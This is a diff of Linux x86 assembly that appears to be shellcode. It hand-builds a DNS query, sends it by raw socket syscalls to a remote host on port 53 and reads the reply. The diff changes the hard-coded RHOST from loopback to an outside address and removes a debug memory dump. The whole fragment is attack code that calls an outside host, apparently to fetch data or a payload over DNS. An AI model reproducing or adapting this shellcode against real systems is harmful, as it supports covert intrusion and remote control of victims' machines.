@@ -37,31 +37,25 @@ socket:
 	xchg eax, ebx
 	pop  ebp
 
-; \x04blah\x03com\x00
-; 0x18
-; 0xbffff900:     0x00040000      0x00001000      0x00000000      0xbffff907
-; 0xbffff910:     0x00000000      0x00010001      0x00000002      0x00000000
-; 0xbffff920:     0x00000001      0xbffff9e6      0x00000000      0xbffffa37
-
 sendto:
 	inc  dl
-	push dx
-	push dx
+	push dx               ; class and type (1, 1)
+	push dx             
 	dec  dl
 	push dx
 	push dword 0x6d6f6303 ; \x03com
 	mov  cl, 0x3
 	push ecx              ; q.rr[0].host = non-deterministic
 	push edx              ; q.nscount = 0, q.arcount = 0
-	mov  dh, 0x01
+	inc  dh
 	push edx              ; q.qdcount = 1, q.ancount = 0
 	mov  dh, 0x4
 	push dx               ; q.flags = 0x4 (AA)
 	push si               ; q.id = non-deterministic
 	mov  esi, esp
-;	push dword 0x03a0f280
-	push dword 0x0100007f ; RHOST
-	mov  dh, 0x35
+	push dword 0x03a0f280
+;	push dword 0x0100007f ; RHOST
+	mov  dh, 0x35         ; RPORT (53)
 	push dx
 	push bp
 	mov  edi, esp
@@ -69,7 +63,7 @@ sendto:
 	push edi
 	cdq
 	push edx
-	push byte 0x19; XXX size
+	push byte 0x19        ; size of the dns request
 	push esi
 	push ebx
 	mov  ecx, esp
@@ -78,7 +72,7 @@ sendto:
 	mov  al, 0x66
 	int  0x80
 
-recv:
+read:
 	pop  ebx
 	mov  dh, 0xc
 	mov  al, 0x3
